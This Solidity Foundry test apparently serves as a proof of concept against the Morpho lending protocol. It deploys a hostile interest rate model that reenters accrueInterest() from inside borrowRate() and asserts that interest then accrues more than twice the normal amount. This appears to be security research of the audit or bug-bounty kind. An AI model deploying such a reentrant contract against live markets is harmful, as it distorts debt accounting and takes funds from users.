// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

import {Morpho} from "../src/Morpho.sol";
import {MarketParams, Market, Id} from "../src/interfaces/IMorpho.sol";
import {MarketParamsLib} from "../src/libraries/MarketParamsLib.sol";

import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../src/mocks/OracleMock.sol";
import {IIrm} from "../src/interfaces/IIrm.sol";

contract ReentrantIrm is IIrm {
    Morpho public morpho;
    MarketParams public mp;

    uint256 public remaining;

    // IMPORTANT: start with remaining = 0 so createMarket() init call does NOT reenter.
    constructor(Morpho _morpho) {
        morpho = _morpho;
        remaining = 0;
    }

    function setMarketParams(MarketParams memory _mp) external {
        mp = _mp;
    }

    function reset(uint256 _times) external {
        remaining = _times;
    }

    // Morpho calls borrowRate() inside _accrueInterest().
    // We reenter Morpho.accrueInterest() a few times before returning.
    function borrowRate(MarketParams memory, Market memory) external returns (uint256) {
        if (remaining > 0) {
            remaining--;
            morpho.accrueInterest(mp);
        }

        // 10% APR converted to per-second rate (wad)
        return uint256(1e17) / 365 days;
    }

    function borrowRateView(MarketParams memory, Market memory) external pure returns (uint256) {
        return uint256(1e17) / 365 days;
    }
}

contract ReentrantIrmTest is Test {
    using MarketParamsLib for MarketParams;

    function testReentrantIrmAccrueAmplification() public {
        // Tokens and oracle
        ERC20Mock loan = new ERC20Mock();
        ERC20Mock col = new ERC20Mock();
        OracleMock oracle = new OracleMock();

        // Make collateral price huge so position stays healthy
        oracle.setPrice(1e36);

        // Deploy Morpho (owner = this test)
        Morpho morpho = new Morpho(address(this));

        // Market params (irm set after deploying IRM)
        MarketParams memory mp;
        mp.loanToken = address(loan);
        mp.collateralToken = address(col);
        mp.oracle = address(oracle);
        mp.irm = address(0);
        mp.lltv = 0.8e18;

        morpho.enableLltv(mp.lltv);

        // Deploy IRM, set params, enable IRM
        ReentrantIrm irm = new ReentrantIrm(morpho);
        mp.irm = address(irm);
        irm.setMarketParams(mp);
        morpho.enableIrm(address(irm));

        // Create market (safe because irm.remaining starts at 0)
        morpho.createMarket(mp);

        // Fund using deal(), approve Morpho
        deal(address(loan), address(this), 1_000_000e18);
        deal(address(col), address(this), 1_000_000e18);
        loan.approve(address(morpho), type(uint256).max);
        col.approve(address(morpho), type(uint256).max);

        // Supply, collateral, borrow
        morpho.supply(mp, 100_000e18, 0, address(this), "");
        morpho.supplyCollateral(mp, 100_000e18, address(this), "");
        morpho.borrow(mp, 10_000e18, 0, address(this), address(this));

        Id id = mp.id();

        // ----- Baseline: one accrue with NO reentrancy -----
        vm.warp(block.timestamp + 30 days);

        (, , uint128 borrowBefore1, , , ) = morpho.market(id);

        irm.reset(0);
        morpho.accrueInterest(mp);

        (, , uint128 borrowAfter1, , , ) = morpho.market(id);

        uint256 deltaSingle = uint256(borrowAfter1) - uint256(borrowBefore1);
        assertGt(deltaSingle, 0);

        // ----- Reentrant: accrue with reentrancy enabled -----
        vm.warp(block.timestamp + 30 days);

        (, , uint128 borrowBefore2, , , ) = morpho.market(id);

        irm.reset(3); // 3 extra nested accrueInterest() calls
        morpho.accrueInterest(mp);

        (, , uint128 borrowAfter2, , , ) = morpho.market(id);

        uint256 deltaReentrant = uint256(borrowAfter2) - uint256(borrowBefore2);
        assertGt(deltaReentrant, 0);

        // Claim: reentrancy causes materially higher accrual in one tx
        assertGt(deltaReentrant, deltaSingle * 2);
    }
}
